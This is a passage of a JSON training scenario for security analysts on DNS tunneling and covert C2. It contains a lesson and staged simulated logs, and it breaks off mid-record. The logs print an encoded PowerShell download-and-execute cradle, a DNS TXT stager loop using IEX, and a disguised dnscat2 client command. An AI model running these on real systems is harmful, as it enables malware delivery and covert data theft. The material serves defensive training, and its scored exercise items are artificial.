@@ -1,0 +1,1190 @@
+{
+  "name": "DNS Tunneling & Covert C2 Communication",
+  "description": "An advanced scenario where an attacker establishes a covert command-and-control channel using DNS tunneling. Analysts must identify anomalous DNS patterns including encoded subdomain labels, abnormal query frequencies, and TXT record abuse to trace the full attack chain from initial phishing infection through data exfiltration over DNS.",
+  "difficulty": "ADVANCED",
+  "category": "Command and Control",
+  "mitreAttackIds": ["T1071.004", "T1132", "T1041", "T1573", "T1105", "T1059.001"],
+  "briefing": "## Scenario Briefing — DNS Tunneling & Covert C2\n\nA network monitoring sensor has flagged anomalous DNS traffic patterns from workstation **WS-PC15**. The DNS query volume from this single host has increased **500%** in the last hour, with queries containing unusually long subdomain labels. Initial triage shows the queries are going to a domain registered just **48 hours ago**. This could be DNS tunneling — a covert communication technique that abuses the DNS protocol.\n\n### What We Know So Far\n\n- **Affected Host:** WS-PC15 (10.0.1.92), assigned to user **a.kumar** (Finance department)\n- **Suspicious Domain:** `updateservice-cdn.com` — registered 2 days ago via a privacy-shielded registrar\n- **DNS Query Volume:** ~3,200 queries in the past hour vs. the host's 30-day average of ~600/hour\n- **Query Characteristics:** Subdomain labels exceeding 50 characters, high entropy strings resembling Base64 encoding\n- **Resolver:** Queries bypassing corporate DNS (10.0.2.1) and going directly to 198.51.100.53\n\n### Your Mission\n\n1. **Identify the initial infection vector** — How did the malware get on WS-PC15?\n2. **Analyze the DNS tunneling mechanism** — What encoding is used? What tool is likely in play?\n3. **Determine what C2 commands were executed** — What did the attacker do once they had a channel?\n4. **Assess the data exfiltration** — What data was stolen and how much?\n5. **Recommend containment and remediation actions**\n\n### Key Analysis Focus Areas\n\n- DNS query name length and entropy\n- Query frequency and beaconing intervals\n- TXT record request patterns\n- Subdomain label encoding schemes\n- DNS traffic volume compared to baseline\n\n**Difficulty:** Advanced | **Estimated Time:** 60 minutes",
+  "lessonContent": "# DNS Tunneling & Covert C2 — Pre-Investigation Lesson\n\nBefore you begin the investigation, let's build a deep understanding of how DNS works, how attackers abuse it for tunneling, and how to detect it.\n\n---\n\n## 1. DNS Protocol Fundamentals\n\nThe Domain Name System (DNS) is one of the most critical — and most trusted — protocols on any network. It translates human-readable domain names (like `google.com`) into IP addresses (like `142.250.80.46`).\n\n### DNS Record Types\n\n| Record Type | Purpose | Example | Max Data Size |\n|---|---|---|---|\n| **A** | Maps domain to IPv4 address | `example.com → 93.184.216.34` | 4 bytes |\n| **AAAA** | Maps domain to IPv6 address | `example.com → 2606:2800:220:1:...` | 16 bytes |\n| **TXT** | Stores arbitrary text data | SPF records, DKIM keys, verification tokens | ~255 bytes per string |\n| **CNAME** | Alias one domain to another | `www.example.com → example.com` | 255 bytes |\n| **MX** | Mail server for the domain | `example.com → mail.example.com` | 255 bytes |\n| **NS** | Authoritative nameserver | `example.com → ns1.example.com` | 255 bytes |\n| **SRV** | Service location | `_sip._tcp.example.com → sip.example.com` | 255 bytes |\n\n### Normal DNS Query Flow\n\n```\n1. User types \"google.com\" in browser\n2. OS checks local DNS cache\n3. Query sent to configured DNS resolver (corporate: 10.0.2.1)\n4. Resolver checks its cache, or queries root → TLD → authoritative servers\n5. Response returned with IP address\n6. Browser connects to the IP\n```\n\n### Why DNS Is Attractive to Attackers\n\n- **Almost never blocked** — DNS (port 53) is allowed outbound on virtually every network\n- **Rarely inspected deeply** — Most firewalls allow DNS traffic without content inspection\n- **Ubiquitous** — Every connected device makes DNS queries, so it blends into normal traffic\n- **Recursive resolution** — Queries will eventually reach the attacker's authoritative nameserver\n- **Supports arbitrary data** — TXT records can hold any text content\n\n---\n\n## 2. How DNS Tunneling Works\n\nDNS tunneling encodes data into DNS queries and responses, effectively creating a bidirectional communication channel over port 53.\n\n### The Mechanism\n\n**Upstream (Client → C2 Server):**\nData is encoded into the subdomain labels of DNS queries.\n\n```\nNormal query:   www.google.com\nTunnel query:   aGVsbG8gd29ybGQ.cmd.data.ns1.updateservice-cdn.com\n                ^^^^^^^^^^^^^^^^ ^^^ ^^^^\n                Base64-encoded   |   Tunnel identifier\n                payload data     Command channel marker\n```\n\nThe attacker's authoritative nameserver for `updateservice-cdn.com` receives these queries and decodes the subdomain labels to extract the data.\n\n**Downstream (C2 Server → Client):**\nData is encoded into DNS responses, typically using TXT records (which support up to 255 bytes per string, with multiple strings possible).\n\n```\nQuery:    beacon.data.ns1.updateservice-cdn.com  TXT\nResponse: \"d2hvYW1pDQpzeXN0ZW1pbmZvDQpuZXQgdXNlcg==\" (Base64 for commands)\n```\n\n### Data Encoding Schemes\n\n| Scheme | Description | Efficiency | Detection |\n|---|---|---|---|\n| **Base64** | Standard Base64 encoding | ~75% | High entropy, `=` padding visible |\n| **Base32** | Uses A-Z, 2-7 only | ~63% | Easier to detect — unusual character distribution |\n| **Hex** | Hexadecimal encoding | ~50% | Only 0-9, a-f characters in labels |\n| **NetBIOS** | Custom encoding | Varies | Tool-specific patterns |\n| **Raw binary** | Direct binary via EDNS | ~95% | Requires EDNS support |\n\n### DNS Label Constraints\n\n- Each label (between dots): max **63 characters**\n- Total domain name: max **253 characters**\n- This limits per-query upstream bandwidth to roughly **180-200 bytes** of encoded data\n- Attackers compensate with **high query volume**\n\n---\n\n## 3. Common DNS Tunneling Tools\n\n### dnscat2\n- Open-source DNS tunneling tool\n- Creates encrypted C2 channel over DNS\n- Supports TXT, CNAME, MX, and A record queries\n- Uses its own encryption layer on top of DNS\n- Client process: `dnscat` or embedded in PowerShell scripts\n- Server process: Ruby-based server on attacker's authoritative NS\n\n### iodine\n- Tunnels IPv4 traffic through DNS\n- Supports NULL, TXT, SRV, MX, CNAME, and A record types\n- Uses Base32, Base64, or raw encoding\n- Creates a virtual network interface (tun device)\n- Client process: `iodine` / Server process: `iodined`\n\n### dns2tcp\n- Tunnels TCP connections over DNS\n- Uses TXT records for data transfer\n- Supports resource record types: KEY, TXT\n- Lightweight — designed for simple TCP relay\n\n### Cobalt Strike DNS Beacon\n- Commercial (and frequently pirated) C2 framework\n- DNS beacon mode communicates entirely over DNS\n- Uses A, AAAA, and TXT record queries\n- Configurable beacon interval (sleep time)\n- Malleable C2 profiles can customize DNS patterns\n\n---\n\n## 4. Detection Indicators\n\nDNS tunneling generates detectable anomalies across multiple dimensions:\n\n### Query Name Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **Subdomain label length** | 5-15 characters | 30-63 characters |\n| **Total query length** | 15-40 characters | 80-253 characters |\n| **Character entropy** | Low-medium (readable words) | High (encoded data) |\n| **Character set** | Alphanumeric, hyphens | Base64 chars (+, /, =) or hex only |\n| **Label count** | 2-4 labels | 4-8+ labels |\n\n### Traffic Pattern Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **Queries per minute** | 5-20 per host | 50-500+ per host |\n| **Unique subdomains** | Low (repeat visits) | Extremely high (every query unique) |\n| **TXT query ratio** | <5% of queries | >50% of queries |\n| **Single domain focus** | Queries spread across many domains | 80%+ to one domain |\n| **Query timing** | Irregular, user-driven | Regular intervals (beaconing) |\n\n### Volume Analysis\n\n| Indicator | Normal DNS | DNS Tunneling |\n|---|---|---|\n| **DNS bytes per hour** | 10-50 KB | 500 KB - 10 MB+ |\n| **Response size (TXT)** | Short SPF/DKIM records | Large, encoded binary data |\n| **Query-to-response ratio** | Roughly 1:1 | May show 1:many for data exfil |\n\n### Entropy Scoring\n\nEntropy measures the randomness of a string. Normal domain names have low entropy (readable words); encoded tunnel data has high entropy.\n\n```\nLow entropy:    www.google.com              (Shannon entropy: ~2.8)\nMedium entropy: cdn-images-us.example.com   (Shannon entropy: ~3.5)\nHigh entropy:   aGVsbG8gd29ybGQ.c2.evil.com (Shannon entropy: ~4.5+)\n```\n\nAn entropy threshold of **3.5-4.0** on subdomain labels catches most tunneling while avoiding false positives from CDN hostnames.\n\n---\n\n## 5. DNS over HTTPS (DoH) — The Evasion Layer\n\nModern attackers increasingly use **DNS over HTTPS (DoH)** to hide DNS tunneling:\n\n- DNS queries are sent inside HTTPS (port 443) to resolvers like `https://dns.google/dns-query`\n- Content is encrypted, so network security tools cannot inspect the query contents\n- Appears as normal HTTPS traffic to firewalls and proxies\n- Bypasses DNS-layer security tools entirely\n\n### Detection Strategies for DoH\n\n- Block or monitor known DoH resolver IPs (Google: 8.8.8.8, Cloudflare: 1.1.1.1)\n- Monitor for TLS connections to known DoH endpoints\n- Use endpoint-level DNS logging (Sysmon Event ID 22) instead of network-level\n- Deploy browser policies that force system DNS resolver usage\n\n---\n\n## 6. Normal vs. Abnormal DNS Baselines\n\nTo detect DNS tunneling, you need to know what normal looks like:\n\n### Normal Workstation DNS Profile (8-hour workday)\n\n- **Total queries:** 3,000-5,000\n- **Unique domains:** 200-500\n- **TXT queries:** <2% of total\n- **Average query length:** 22 characters\n- **Max query length:** ~50 characters (long CDN hostnames)\n- **Top domains:** google.com, microsoft.com, office365.com, company.com\n- **Query timing:** Clustered around browsing activity, irregular intervals\n\n### DNS Tunneling Profile (1 hour)\n\n- **Total queries:** 2,000-10,000+ (to a single domain)\n- **Unique subdomains:** Nearly 100% unique\n- **TXT queries:** >60% of total\n- **Average query length:** 80+ characters\n- **Max query length:** 200+ characters\n- **Top domain:** Single attacker-controlled domain\n- **Query timing:** Regular 10-60 second intervals (beaconing)\n\n---\n\n## 7. Investigation Methodology\n\nWhen you suspect DNS tunneling, follow this process:\n\n1. **Identify the suspect domain** — Look for newly registered domains with high query volume\n2. **Analyze query patterns** — Check subdomain length, entropy, and record types\n3. **Establish the timeline** — When did the anomalous queries start?\n4. **Trace the infection** — What happened on the host before DNS tunneling began?\n5. **Identify the tool** — Query patterns can fingerprint dnscat2 vs. iodine vs. Cobalt Strike\n6. **Assess impact** — Calculate approximate data volume exfiltrated\n7. **Contain and remediate** — Block the domain, isolate the host, remove the implant\n\n---\n\n## Ready?\n\nWhen you're ready, click **Continue to Investigation** to start analyzing the DNS tunneling incident. Pay close attention to query patterns, subdomain encoding, and timing intervals. Good luck!",
+  "estimatedMinutes": 60,
+  "isActive": true,
+  "stages": [
+    {
+      "stageNumber": 1,
+      "title": "Initial Infection Vector",
+      "description": "Investigate how the malware was delivered to WS-PC15. Trace the initial phishing email, macro execution, and payload delivery attempt that ultimately drove the attacker to use DNS tunneling as their C2 channel.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EMAIL_GATEWAY",
+          "summary": "Email Gateway — Inbound email to a.kumar@corp.local from 'invoices@globaltrade-partners.com' with subject 'Q3 Financial Review — Action Required'. Contains macro-enabled attachment 'Q3_Financial_Summary.xlsm' (186 KB). SPF passed but DKIM failed. Sender domain registered 3 days ago.",
+          "rawLog": {
+            "messageId": "<8f3a2b1c-94d7-4e5f-b8a1-3c7d9e2f5a1b@globaltrade-partners.com>",
+            "timestamp": "2025-09-18T09:12:38Z",
+            "from": "invoices@globaltrade-partners.com",
+            "to": "a.kumar@corp.local",
+            "subject": "Q3 Financial Review — Action Required",
+            "attachments": [
+              {
+                "filename": "Q3_Financial_Summary.xlsm",
+                "size": 190464,
+                "contentType": "application/vnd.ms-excel.sheet.macroEnabled.12",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+              }
+            ],
+            "spfResult": "pass",
+            "dkimResult": "fail",
+            "dmarcResult": "none",
+            "senderIp": "185.234.72.19",
+            "xMailer": "Microsoft Outlook 16.0",
+            "returnPath": "invoices@globaltrade-partners.com",
+            "receivedHeaders": [
+              "from mail.globaltrade-partners.com (185.234.72.19) by mx01.corp.local (10.0.4.5) with ESMTPS; Thu, 18 Sep 2025 09:12:38 +0000"
+            ],
+            "action": "DELIVERED",
+            "threatScore": 35,
+            "domainAge": "3 days"
+          },
+          "severity": "MEDIUM",
+          "hostname": "MX-GW-01",
+          "username": "a.kumar",
+          "sourceIp": "185.234.72.19",
+          "destIp": "10.0.4.5",
+          "timestamp": "2025-09-18T09:12:38Z",
+          "isEvidence": true,
+          "evidenceTag": "PHISHING_EMAIL",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — Process creation: EXCEL.EXE spawned cmd.exe on WS-PC15. User a.kumar opened the macro-enabled spreadsheet, which executed a command shell — a strong indicator of malicious macro execution.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-09-18T09:15:42Z",
+            "ProcessGuid": "{WS-PC15-a1b2c3d4-0001}",
+            "ProcessId": 7824,
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADUAMwAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==",
+            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0000}",
+            "ParentProcessId": 6112,
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\a.kumar\\Downloads\\Q3_Financial_Summary.xlsm\"",
+            "User": "CORP\\a.kumar",
+            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
+            "IntegrityLevel": "Medium",
+            "LogonGuid": "{WS-PC15-login-a1b2}",
+            "LogonId": "0x3E7"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "cmd.exe",
+          "eventId": "1",
+          "timestamp": "2025-09-18T09:15:42Z",
+          "isEvidence": true,
+          "evidenceTag": "MACRO_EXECUTION",
+          "sortOrder": 2
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Suspicious macro execution detected on WS-PC15. EXCEL.EXE spawned cmd.exe which launched PowerShell with a Base64-encoded command. Classified as likely malicious macro payload delivery (T1059.001).",
+          "rawLog": {
+            "alertId": "EDR-2025-09182301",
+            "severity": "HIGH",
+            "timestamp": "2025-09-18T09:15:44Z",
+            "hostname": "WS-PC15",
+            "username": "CORP\\a.kumar",
+            "processName": "powershell.exe",
+            "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADUAMwAvAHMAdABhAGcAZQByAC4AcABzADEAJwApAA==",
+            "decodedCommand": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.53/stager.ps1')",
+            "parentProcess": "cmd.exe",
+            "grandparentProcess": "EXCEL.EXE",
+            "alertType": "Malicious Macro — Office Application Spawning Script Interpreter",
+            "detectionRule": "OFFICE_CHILD_SCRIPT_INTERPRETER",
+            "mitreTactic": "Execution",
+            "mitreTechnique": "T1059.001",
+            "riskScore": 92,
+            "actionTaken": "ALERT_ONLY"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "powershell.exe",
+          "timestamp": "2025-09-18T09:15:44Z",
+          "isEvidence": true,
+          "evidenceTag": "EDR_MACRO_ALERT",
+          "sortOrder": 3
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — WS-PC15 queried for the A record of the attacker's payload hosting server at 198.51.100.53. The domain 'updateservice-cdn.com' was resolved through the corporate DNS resolver.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:15:45Z",
+            "queryName": "updateservice-cdn.com",
+            "queryType": "A",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "198.51.100.53",
+            "srcIp": "10.0.1.92",
+            "srcPort": 54821,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 60,
+            "querySize": 38,
+            "responseSize": 54
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "198.51.100.53",
+          "timestamp": "2025-09-18T09:15:45Z",
+          "isEvidence": true,
+          "evidenceTag": "C2_DOMAIN_RESOLUTION",
+          "sortOrder": 4
+        },
+        {
+          "logType": "FIREWALL",
+          "summary": "Firewall — BLOCKED outbound HTTP connection from WS-PC15 (10.0.1.92) to external IP 198.51.100.53 on port 80. The corporate firewall blocks direct HTTP to non-whitelisted external IPs, forcing the attacker to find an alternative communication channel.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:15:47Z",
+            "action": "DENY",
+            "direction": "OUTBOUND",
+            "srcIp": "10.0.1.92",
+            "srcPort": 49312,
+            "dstIp": "198.51.100.53",
+            "dstPort": 80,
+            "protocol": "TCP",
+            "rule": "BLOCK-OUTBOUND-HTTP-NONWHITELIST",
+            "zone": "WORKSTATION->EXTERNAL",
+            "reason": "Outbound HTTP to non-whitelisted destination blocked by policy",
+            "application": "powershell.exe",
+            "bytesBlocked": 0,
+            "sessionId": "fw-sess-2025091809154701"
+          },
+          "severity": "MEDIUM",
+          "hostname": "FW-EDGE-01",
+          "sourceIp": "10.0.1.92",
+          "destIp": "198.51.100.53",
+          "processName": "powershell.exe",
+          "timestamp": "2025-09-18T09:15:47Z",
+          "isEvidence": true,
+          "evidenceTag": "BLOCKED_HTTP_C2",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — PowerShell executed a second encoded command after the direct HTTP download failed. This command initiates DNS-based payload retrieval as a fallback mechanism, querying TXT records to download the stager in chunks.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-09-18T09:16:05Z",
+            "ProcessGuid": "{WS-PC15-a1b2c3d4-0003}",
+            "ProcessId": 8456,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -w hidden -c \"$d='';for($i=0;$i -lt 12;$i++){$d+=(Resolve-DnsName -Name \\\"stage$i.data.ns1.updateservice-cdn.com\\\" -Type TXT).Strings};IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))\"",
+            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0001}",
+            "ParentProcessId": 7824,
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -e SQBFAFgAIAAo...",
+            "User": "CORP\\a.kumar",
+            "Hashes": "SHA256=b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
+            "IntegrityLevel": "Medium"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-09-18T09:16:05Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_PAYLOAD_DOWNLOAD",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "Look at the process parent-child chain: EXCEL.EXE spawned cmd.exe which launched PowerShell. Office applications should NEVER launch command interpreters — this is a classic malicious macro indicator.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The firewall blocked the direct HTTP download to 198.51.100.53. Notice how the attacker's payload includes a fallback mechanism that uses DNS TXT record queries to download the stager instead. This is why the attacker pivoted to DNS tunneling.",
+          "pointsPenalty": 4,
+          "sortOrder": 2
+        },
+        {
+          "content": "The Base64-encoded PowerShell command in the Sysmon log decodes to: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.53/stager.ps1'). This is a classic cradle download technique (T1059.001 + T1105).",
+          "pointsPenalty": 3,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 2,
+      "title": "DNS Tunneling Establishment",
+      "description": "Analyze the DNS traffic patterns that indicate a covert tunneling channel has been established. Compare abnormal queries to normal DNS baselines and identify the tunneling tool's fingerprint.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — Normal baseline DNS query from WS-PC15 resolving 'www.google.com' (A record). This is legitimate user browsing activity and serves as a comparison baseline for the anomalous queries that follow.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:20:01Z",
+            "queryName": "www.google.com",
+            "queryType": "A",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "142.250.80.46",
+            "srcIp": "10.0.1.92",
+            "srcPort": 61234,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 300,
+            "querySize": 32,
+            "responseSize": 48
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:20:01Z",
+          "isEvidence": false,
+          "sortOrder": 1
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — Normal baseline DNS query from WS-PC15 resolving 'outlook.office365.com' (CNAME → A). Legitimate Office 365 traffic — short query name, standard record type, well-known domain.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:20:15Z",
+            "queryName": "outlook.office365.com",
+            "queryType": "A",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "52.96.166.34",
+            "srcIp": "10.0.1.92",
+            "srcPort": 53412,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 120,
+            "querySize": 38,
+            "responseSize": 54,
+            "cnameChain": ["outlook.ha.office365.com", "outlook.ms-acdc.office.com"]
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:20:15Z",
+          "isEvidence": false,
+          "sortOrder": 2
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — SUSPICIOUS TXT query with Base64-encoded subdomain label (52 characters). WS-PC15 queried 'aW5pdGlhbGl6ZV9jMl9jaGFubmVsX3YxLjI.data.ns1.updateservice-cdn.com' — this is the DNS tunnel initialization handshake.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:25:12Z",
+            "queryName": "aW5pdGlhbGl6ZV9jMl9jaGFubmVsX3YxLjI.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"Y29ubmVjdGVkOnNlc3Npb24taWQ9QUI3OEMyRDQ=\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 52001,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 84,
+            "responseSize": 142,
+            "queryNameLength": 67,
+            "subdomainEntropy": 4.52
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:25:12Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_TUNNEL_INIT",
+          "sortOrder": 3
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — SUSPICIOUS TXT query with encoded subdomain (58 characters). Part of rapid burst of DNS queries to data.ns1.updateservice-cdn.com — query interval is 2 seconds, consistent with DNS tunneling tool beaconing.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:25:14Z",
+            "queryName": "c2Vzc2lvbl9jb25maXJtX2hlYXJ0YmVhdF9wa3QwMQ.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"YWNrOmhlYXJ0YmVhdF9pbnRlcnZhbD0zMHM=\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 52003,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 91,
+            "responseSize": 138,
+            "queryNameLength": 73,
+            "subdomainEntropy": 4.61
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:25:14Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_TUNNEL_BEACON",
+          "sortOrder": 4
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — SUSPICIOUS TXT query with 61-character encoded subdomain label. Third query in rapid succession to updateservice-cdn.com within 4 seconds. TTL is 0 (no caching), which is highly unusual and ensures every query reaches the authoritative nameserver.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:25:16Z",
+            "queryName": "ZW5jcnlwdGlvbl9uZWdvdGlhdGVfYWVzMjU2X2tleXhjaGc.data.ns1.updateservice-cdn.com",
+            "queryType": "TXT",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "\"a2V5OkFFUy0yNTYtQ0JDOml2PTRkNjU3MzY1NzQ2OTZmNmU=\"",
+            "srcIp": "10.0.1.92",
+            "srcPort": 52005,
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "hostname": "WS-PC15",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 0,
+            "querySize": 97,
+            "responseSize": 156,
+            "queryNameLength": 79,
+            "subdomainEntropy": 4.73
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:25:16Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_TUNNEL_ENCRYPTION_NEGOTIATION",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — Process creation of 'svchost-update.exe' spawned by PowerShell on WS-PC15. The binary name is masquerading as a legitimate Windows service host. This is the DNS tunneling client (likely dnscat2) that was assembled from the TXT record payload chunks.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-09-18T09:24:58Z",
+            "ProcessGuid": "{WS-PC15-a1b2c3d4-0005}",
+            "ProcessId": 9120,
+            "Image": "C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe",
+            "CommandLine": "\"C:\\Users\\a.kumar\\AppData\\Local\\Temp\\svchost-update.exe\" --dns data.ns1.updateservice-cdn.com --secret 4d6573746f6e --maxlen 57",
+            "ParentProcessGuid": "{WS-PC15-a1b2c3d4-0003}",
+            "ParentProcessId": 8456,
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORP\\a.kumar",
+            "Hashes": "SHA256=7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
+            "IntegrityLevel": "Medium",
+            "FileVersion": "1.0.0.0",
+            "Description": "Windows Service Host Update",
+            "OriginalFileName": "dnscat2-client.exe"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC15",
+          "username": "a.kumar",
+          "processName": "svchost-update.exe",
+          "eventId": "1",
+          "timestamp": "2025-09-18T09:24:58Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_TUNNEL_CLIENT",
+          "sortOrder": 6
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow — DNS traffic volume anomaly from WS-PC15. In a 10-minute window, the host generated 847 DNS queries (142 KB total) compared to its baseline of 8-12 queries per 10-minute window. 94% of queries are TXT type to a single domain.",
+          "rawLog": {
+            "timestamp": "2025-09-18T09:30:00Z",
+            "srcIp": "10.0.1.92",
+            "dstIp": "10.0.2.1",
+            "dstPort": 53,
+            "protocol": "UDP",
+            "bytesIn": 98240,
+            "bytesOut": 142580,
+            "packetsIn": 847,
+            "packetsOut": 847,
+            "duration": 600,
+            "application": "DNS",
+            "hostname": "WS-PC15",
+            "queryCount": 847,
+            "uniqueDomains": 1,
+            "topDomain": "data.ns1.updateservice-cdn.com",
+            "txtQueryPercentage": 94.2,
+            "avgQueryLength": 78.4,
+            "baselineQueriesPer10Min": 10,
+            "anomalyScore": 98.7
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC15",
+          "sourceIp": "10.0.1.92",
+          "destIp": "10.0.2.1",
+          "timestamp": "2025-09-18T09:30:00Z",
+          "isEvidence": true,
+          "evidenceTag": "DNS_TRAFFIC_ANOMALY",
+          "sortOrder": 7
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation Alert — DNS anomaly detection rule triggered. WS-PC15 is generating DNS queries with subdomain entropy >4.0, query lengths >50 characters, and >90% TXT type queries to a single recently-registered domain. Pattern matches known DNS tunneling behavior.",
